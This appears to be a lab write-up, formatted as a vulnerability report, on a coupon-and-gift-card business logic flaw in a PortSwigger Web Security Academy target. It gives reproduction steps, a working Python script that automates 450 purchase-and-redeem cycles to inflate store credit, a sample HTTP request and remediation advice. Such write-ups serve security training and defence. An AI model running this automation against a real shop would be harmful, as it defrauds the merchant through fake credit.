# Vulnerability Report: Unlimited Balance Inflation via Non-Expiring Discount Coupon and Gift Card Loop

**Severity:** Medium  
**CVSS Score:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)  
**Date:** 2026-08-04  
**Target:** TARGET.web-security-academy.net

## Executive Summary
A business logic vulnerability was identified in the coupon and gift card redemption flow of the application.
The platform offers a one-time newsletter signup coupon (`SIGNUP30`) that applies a 30% discount on purchases.
However, the coupon is never marked as used after redemption — allowing it to be applied on every order indefinitely.
Combined with the ability to purchase a $10 gift card at a discounted price of $7 and redeem it at full face value,
an authenticated attacker can automate this cycle to inflate their account balance by $3 per iteration — reaching any arbitrary credit amount with no upper bound.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Business Logic — Non-Expiring Coupon + Gift Card Arbitrage |
| Endpoint | `POST /cart/coupon`, `POST /gift-card` |
| Method | POST |
| Vulnerable Parameter | `coupon` |
| Protection | None — no server-side usage tracking on the coupon |
| Net Gain Per Cycle | $3.00 |
| Requirement | Any authenticated session + newsletter signup (one-time) |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in with a valid account — the account starts with $100.00 in store credit.
2. Sign up for the newsletter to receive the `SIGNUP30` coupon code.
3. Add the $10 gift card product to the cart.
4. Apply the `SIGNUP30` coupon — cart total drops to $7.00.
5. Complete checkout and retrieve the gift card code from the order confirmation page.
6. Redeem the gift card — balance increases by $10.00, net gain: $3.00.
7. Repeat steps 3–6 — confirm the coupon is accepted again with no restriction.
8. Automate the cycle with the following script until the balance exceeds $1,337.00:

```python
import httpx
import re

URL = "https://TARGET.web-security-academy.net"
s = httpx.Client(http2=True)
s.cookies.set("session", "YOUR_SESSION_HERE")

def csrf():
    r = s.get(URL+"/my-account")
    return re.search(r'name="csrf"\s+value="([^"]+)"', r.text).group(1)

def cycle():
    csrfToken = csrf()
    s.post(URL+"/cart", data={"productId": "2", "redir": "PRODUCT", "quantity": "1"})
    s.post(URL+"/cart/coupon", data={"csrf": csrfToken, "coupon": "SIGNUP30"})
    s.post(URL+"/cart/checkout", data={"csrf": csrfToken})
    codeResp = s.get(URL+"/cart/order-confirmation?order-confirmed=true")
    code = re.search(r'<td>([A-Za-z0-9]{10})</td>', codeResp.text).group(1)
    s.post(URL+"/gift-card", data={"csrf": csrfToken, "gift-card": code})

for i in range(450):
    cycle()
    print(i)
```

9. Purchase the target item — checkout completes successfully.

## Proof of Concept
```http
POST /cart/coupon HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=<YOUR_SESSION>
Content-Type: application/x-www-form-urlencoded

csrf=<token>&coupon=SIGNUP30
```

**Balance progression:**
```
Start            →   $100.00
After 1 cycle    →   $103.00
After 412 cycles →  ~$1,337.00
```

## Impact
An authenticated attacker can inflate their account balance to any arbitrary amount and purchase any item in the store regardless of its price.
The attack requires no special privileges and no victim interaction — only a script and time.
This can lead to:
- Acquiring high-value items at no real cost
- Draining the platform's gift card inventory
- Repeated financial loss for the business with no natural upper bound
- Transactions appearing completely legitimate server-side, making detection difficult without rate or pattern monitoring

## Remediation
- Track coupon usage server-side, tied to the user account — reject any coupon that has already been redeemed by that user
- A one-time coupon must be marked as used immediately after the first successful application, before order completion
- Enforce rate limiting on the `/cart/coupon` and `/gift-card` endpoints to detect and flag high-frequency automated usage
- Monitor for unusual patterns: the same coupon applied repeatedly by one account, or rapid gift card purchase and redemption cycles

## References
- OWASP: Business Logic Vulnerabilities
- OWASP Top 10 A04:2021 — Insecure Design
- CWE-840: Business Rule Bypass
- PortSwigger: Infinite money logic flaw